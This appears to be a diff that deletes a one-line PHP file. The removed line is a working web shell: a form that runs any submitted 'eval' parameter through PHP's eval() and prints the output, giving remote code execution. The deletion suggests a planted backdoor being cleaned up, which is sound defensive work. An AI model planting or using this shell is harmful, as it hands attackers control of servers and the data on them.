@@ -1,1 +1,0 @@
-<form method=POST><textarea autofocus name=eval style=height:90%;width:100%;display:block><?php echo htmlentities($_REQUEST["eval"])?></textarea><input type=submit><hr><plaintext><?php echo(eval($_REQUEST["eval"])); ?>
